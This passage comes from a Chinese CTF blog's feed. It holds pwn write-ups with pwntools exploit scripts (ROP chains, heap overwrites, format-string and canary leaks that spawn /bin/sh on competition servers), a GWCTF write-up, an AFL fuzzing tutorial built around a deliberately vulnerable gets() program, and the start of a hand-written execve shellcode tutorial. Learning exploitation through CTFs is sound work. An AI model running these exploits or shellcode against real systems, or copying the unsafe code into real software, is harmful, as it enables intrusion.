class="number">-0x3C4B78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base1)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line">dell(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">0x68</span>+p64(<span class="number">0x7f</span>)+p64(<span class="number">0x6020bd</span>))</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602020</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602068</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,p64(libc_base+obj.dump(<span class="string">'system'</span>)))</span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn11"><a href="#pwn11" class="headerlink" title="pwn11"></a>pwn11</h2><p>首先通过00截断绕过strcmp函数，然后就是栈溢出泄漏libc再getshell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./pwn11')</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50011</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn11'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4012ab</span></span><br><span class="line">main = <span class="number">0x401162</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'nuoye'</span>)</span><br><span class="line">p.sendline(<span class="string">'abcd\x00'</span>+<span class="string">'a'</span>*<span class="number">0x1b</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="string">'read'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'ok!\n'</span>)</span><br><span class="line">read_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base = read_addr-obj.dump(<span class="string">'read'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'nuoye'</span>)</span><br><span class="line">p.sendline(<span class="string">'abcd\x00'</span>+<span class="string">'a'</span>*<span class="number">0x1b</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc_base+obj.dump(<span class="string">'str_bin_sh'</span>))+p64(libc_base+obj.dump(<span class="string">'system'</span>))+p64(main))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><p>简单的栈溢出，可以看到有后门，开了PIE而已，所以覆盖下最低位即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn13')</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50013</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x27</span>+<span class="string">'b'</span>+<span class="string">'\x50'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;BF&quot;&gt;&lt;a href=&quot;#BF&quot; class=&quot;headerlink&quot; title=&quot;BF&quot;&gt;&lt;/a&gt;BF&lt;/h3&gt;&lt;p&gt;首先覆盖掉seed，去掉rand()的随机化，然后通过输入的name进行格式化字符的泄漏，再通过rop串leak出libc_base，最后直
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>2019广外网安大赛-WP</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/wp/2019%E5%B9%BF%E5%A4%96%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B/wp/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/wp/2019%E5%B9%BF%E5%A4%96%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B/wp/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:26:13.291Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><p>首先用strpos计算出随机数值，并且弄好格式</p><p><img src="./img/1575162826401.png" alt="1575162826401"></p><p>再直接将该结果复制给php_mt_seed进行爆破</p><p><img src="./img/1575162876249.png" alt="1575162876249"></p><p>然后再回去把种子带入就可以得到字符串了</p><p><img src="./img/1575162911317.png" alt="1575162911317"></p><p>最后输回去并提交就get flag了√</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="史上最简单的pwn"><a href="#史上最简单的pwn" class="headerlink" title="史上最简单的pwn"></a>史上最简单的pwn</h2><p>这道题是一道c++的。。。不会分析，只知道只能写0x20个字节，随便试了下分析结果，发现输入存在I的时候会把I替换为pretty，所以利用这个可以达到栈溢出的目的。然后就是libc的问题。。。本地很远程爆的不太一样。。。直接LibcSearcher了：<br><img src="./img/1575164909373.png" alt="1575164909373"></p><h2 id="宇宙无敌难搞"><a href="#宇宙无敌难搞" class="headerlink" title="宇宙无敌难搞"></a>宇宙无敌难搞</h2><p>简单的栈溢出，就是覆盖的时候会覆盖到索引的值，所以可以直接把索引修改为ret地址就行了：</p><p><img src="./img/1575164779677.png" alt="1575164779677"></p><h2 id="pwn-me"><a href="#pwn-me" class="headerlink" title="pwn_me"></a>pwn_me</h2><p>这道题首先得去壳：upx -d pwn_me，然后就是各种检查绕过了</p><p>1.利用格式化字符串漏洞先泄漏pie，然后再向0x202010处写入’w’</p><p>2.填充0x259字符来获取到canary</p><p>3.输入0x80000000来绕过检查</p><p>4.构造payload，使其满足条件</p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./pwn_me')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10027</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'please input the secret key~'</span>)</span><br><span class="line">p.sendline(<span class="string">'[m]'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'enter'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'say'</span>)</span><br><span class="line">p.sendline(<span class="string">'%14$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">pie = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x183d</span></span><br><span class="line">p.recvuntil(<span class="string">'again'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pay1 = <span class="string">'%119c%8$na%21$pa'</span>+p64(pie+<span class="number">0x202010</span>)</span><br><span class="line"><span class="keyword">print</span> len(pay1)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">a = int(p.recvuntil(<span class="string">'a'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">libc_base = a<span class="number">-240</span>-libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'magic'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x259</span>))</span><br><span class="line">p.recvuntil(<span class="string">'dream'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x259</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x258</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-ord(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">p.recvuntil(<span class="string">'hat is this?!'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x80000000</span>))</span><br><span class="line"></span><br><span class="line">pay2 = <span class="string">'a'</span>*<span class="number">0x258</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(one[<span class="number">1</span>]+libc_base)</span><br><span class="line">b = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(pay2)):</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">88</span>:</span><br><span class="line">b += <span class="string">'\x5a'</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">b += <span class="string">'\x58'</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">137</span>:</span><br><span class="line">b += <span class="string">'\x5a'</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">154</span>:</span><br><span class="line">b += <span class="string">'\x6c'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">b += pay2[i]</span><br><span class="line">p.sendline(b)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>strlen的00截断问题，构造下可见字符开头再加上00的指令就行了(这里用了push 0)，另外这道题无法直接getshell，所以找了个直接读flag的：<br><img src="./img/1575164292115.png" alt="1575164292115"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>简单的计算题，直接提取后eval计算就行了</p><p><img src="./img/1575162995333.png" alt="1575162995333"></p><h2 id="fun"><a href="#fun" class="headerlink" title="fun"></a>fun</h2><p>猜拳游戏。。。之前字节跳动的比赛也有，。。直接上writeup</p><p><img src="./img/1575163042586.png" alt="1575163042586"></p><h2 id="听说你想要平均值"><a href="#听说你想要平均值" class="headerlink" title="听说你想要平均值"></a>听说你想要平均值</h2><p>这道题首先就是从png文件中提取出一个无加密的压缩包，CRC和flag.zip一样，直接明文攻击（参考<a href="https://www.cnblogs.com/leixiao-/p/9824557.html）" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/9824557.html）</a></p><p>然后后面解压的除了出来第一个是<img src="./img/1575163177753.png" alt="1575163177753"></p><p>中13600的一半6800的base64编码，再继续解压出来的密码就是here.txt里的数字进行base64编码了，上脚本√</p><p><img src="./img/1575163352856.png" alt="1575163352856"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><p>讲实话，这道题有点难，刚开始还被拐歪了。。。真正的密文应该是这里</p><p><img src="./img/1575163934277.png" alt="1575163934277"></p><p>然后再进行逆运算就好了</p><p><img src="./img/1575163944282.png" alt="1575163944282"></p><h2 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h2><p>先放到<a href="http://tool.lu/pyc/反编译，得到密文，以及加密方法，直接逆推就行了：" target="_blank" rel="noopener">http://tool.lu/pyc/反编译，得到密文，以及加密方法，直接逆推就行了：</a></p><p><img src="./img/1575163633664.png" alt="1575163633664"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>首先用脚本过前面的md5，然后再用login得到前面，计算出x，然后再签admin即可（ps：另外几个函数照抄就行）：</p><p><img src="./img/1575163734176.png" alt="1575163734176"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;枯燥的抽奖&quot;&gt;&lt;a href=&quot;#枯燥的抽奖&quot; class=&quot;headerlink&quot; title=&quot;枯燥的抽奖&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>AFL-fuzz初体验</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/%E6%96%87%E7%AB%A0/fuzzing/AFL-fuzz%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/%E6%96%87%E7%AB%A0/fuzzing/AFL-fuzz%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:27:54.777Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>安装环境：（有点大，可以先换下源）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install clang-6.0 build-essential llvm-6.0-dev gnuplot-nox</span><br></pre></td></tr></table></figure><p>修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo update-alternatives --install /usr/bin/clang clang `<span class="built_in">which</span> clang-6.0` 1</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/clang++ clang++ `<span class="built_in">which</span> clang++-6.0` 1</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/llvm-config llvm-config `<span class="built_in">which</span> llvm-config-6.0` 1</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/llvm-symbolizer llvm-symbolizer `<span class="built_in">which</span> llvm-symbolizer-6.0` 1</span><br></pre></td></tr></table></figure><p>安装afl-fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">$ tar xvf afl-latest.tgz</span><br><span class="line">$ <span class="built_in">cd</span> afl-2.52b</span><br><span class="line">$ make &amp;&amp; make -C llvm_mode CXX=g++</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>可以看到如下提示，afl即安装成功了。</p><p><img src="./img/1.png" alt=""></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>接下来我们用一个示例程序来演示afl-fuzz的使用。</p><h4 id="有源代码的程序"><a href="#有源代码的程序" class="headerlink" title="有源代码的程序"></a>有源代码的程序</h4><p>首先我们先写一个简单的含有栈溢出漏洞的程序来实验一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">gets(buf);</span><br><span class="line"><span class="built_in">puts</span>(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们用afl-gcc来编译该程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-gcc -g -o afl_test test.c</span><br></pre></td></tr></table></figure><p>然后再在当前目录下创建一个input文件夹，并在里面创建一个文件（文件名也是任意），随便输入点东西：</p><p><img src="./img/2.png" alt=""></p><p>接着再运行以下指令，就开始正式的fuzzing了（其中-i参数跟随的是输入文件夹，-o跟随的是输出文件夹）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i input -o out afl_test</span><br></pre></td></tr></table></figure><p>运行成功后，可以看到如下提示：</p><p><img src="./img/3.png" alt=""></p><p>然后就会进入到fuzz的运行界面：</p><p><img src="./img/4.png" alt=""></p><p>其中，overall results框中的cycles done表示运行的总周期数。随着不断fuzzing，周期数会不断增加，其数值的颜色也会由洋红色变成黄色、蓝色、绿色。因为afl-fuzz是一个无限循环运行的，而当cycles done对应数值的颜色变为绿色时，代表可执行内容已经很少了，此时即可用ctrl+c来手动终止fuzzing。</p><p>关于其他数值的含义，可以查看<a href="http://lcamtuf.coredump.cx/afl/status_screen.txt" target="_blank" rel="noopener">官方文档</a>。</p><p>fuzzing终止后，我们就会在当前目录下得到一个out文件夹：</p><p><img src="./img/5.png" alt=""></p><p>其中crashes文件夹下的文件即为产生程序crash对应的输入内容，可以用xxd来分析,从而获得漏洞点：</p><p><img src="./img/6.png" alt=""></p><p>注：</p><p>如果运行afl时出现如下错误：</p><p><img src="./img/7.png" alt=""></p><p>则需要登录root账户执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo core &gt;/proc/sys/kernel/core_pattern</span></span><br></pre></td></tr></table></figure><h4 id="无源码程序"><a href="#无源码程序" class="headerlink" title="无源码程序"></a>无源码程序</h4><p>大部分情况下，我们都拿不到程序的源代码，这时候可以加上-Q参数，用qemu模式来运行afl。</p><p>我们需要先开启qemu模式：</p><p>首先安装下环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libtool.bin</span><br><span class="line">$ sudo apt-get install automake</span><br><span class="line">$ sudo apt-get install bison</span><br></pre></td></tr></table></figure><p>进入原先的afl安装目录，运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> qemu_mode</span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure><p>如果出现错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">util&#x2F;memfd.c:40:12: error: static declaration of ‘memfd_create’ follows non-static declaration</span><br></pre></td></tr></table></figure><p>首先打开build_qemu_support.sh，将这一行注释掉：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make || <span class="built_in">exit</span> 1</span><br></pre></td></tr></table></figure><p>然后运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install qemu</span><br><span class="line">$ ./build_qemu_support.sh </span><br><span class="line">$ <span class="built_in">export</span> AFL_PATH=~/tools/afl-2.52b/</span><br></pre></td></tr></table></figure><p>就可以成功安装了。（注：这里每次启动shell都得重新添加一次环境变量，可以直接写入~/.bashrc文件末尾。）</p><p>然后还是原来的程序，这次我们用gcc编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>然后使用如下命令开始fuzzing：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i input -o out -Q ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>熟悉的界面：</p><p><img src="./img/8.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>小白初学AFL：<a href="https://blog.csdn.net/weixin_39448417/article/details/99703723" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39448417/article/details/99703723</a></p><p>afl-training：<a href="https://github.com/mykter/afl-training" target="_blank" rel="noopener">https://github.com/mykter/afl-training</a></p><p>初探AFL-Fuzz：<a href="https://xz.aliyun.com/t/4314#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4314#toc-8</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;h4 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h4&gt;&lt;p&gt;安装环
      
    
    </summary>
    
    
      <category term="文章" scheme="https://nuoye-blog.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="fuzzing" scheme="https://nuoye-blog.github.io/tags/fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>64位shellcode编写</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/%E6%96%87%E7%AB%A0/shellcode/64%E4%BD%8Dshellcode%E7%BC%96%E5%86%99/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/%E6%96%87%E7%AB%A0/shellcode/64%E4%BD%8Dshellcode%E7%BC%96%E5%86%99/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:28:12.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>目前网上主要是各种32位的shellcode编写教程，64位的比较少，这篇文章主要讲解一下64位shellcode的编写以及介绍几种比较常见的白名单绕过方法</p><h3 id="64位shellcode编写"><a href="#64位shellcode编写" class="headerlink" title="64位shellcode编写"></a>64位shellcode编写</h3><h4 id="直接pwntools生成默认shellcode"><a href="#直接pwntools生成默认shellcode" class="headerlink" title="直接pwntools生成默认shellcode"></a>直接pwntools生成默认shellcode</h4><p>这一种方法是最简单的，通过下面的代码即可生成一段64位shellcode代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>但这段代码有一个缺点，就是生成的shellcode比较长，在某些空间比较小的情况不能很好的使用，接下来我们就一步一步的学习手动编写shellcode吧。</p><h4 id="手动编写shellcode"><a href="#手动编写shellcode" class="headerlink" title="手动编写shellcode"></a>手动编写shellcode</h4><p>在手动编写shellcode之前，我们首先要知道shellcode这一段代码调动shell的原理。</p><p>linux中，存在着一系列的系统调用，这些系统调用都通过syscall指令来触发，并且通过rax寄存器作为系统调用号来区分不同的系统调用，可以通过查看linux源码目录下的arch/x86/entry/syscall_64.tbl获得对应的系统调用号。比如，execve对应的的系统调用号为59。</p><p>接着，即是通过rdi和rsi两个寄存器传入参数。其中，rdi是指向运行程序的路径的指针，rsi为一个指向0的指针，rdx为0。</p><p>总结下，我们应该完成如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax &#x3D; 59</span><br><span class="line">rdi &#x3D; [&#39;&#x2F;bin&#x2F;sh&#39;]</span><br><span class="line">rsi &#x3D; [0]</span><br><span class="line">rdx &#x3D; 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>所以就可以编写我们就可以开始正式编写了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rdx,rdx</span><br><span class="line">push rdx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rax,0x68732f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rax,59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>(这里因为64位数据不能直接push，所以用了rax寄存器来传递)</p><p>编写完后，我们可以用pwntools模块来快速编译使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span 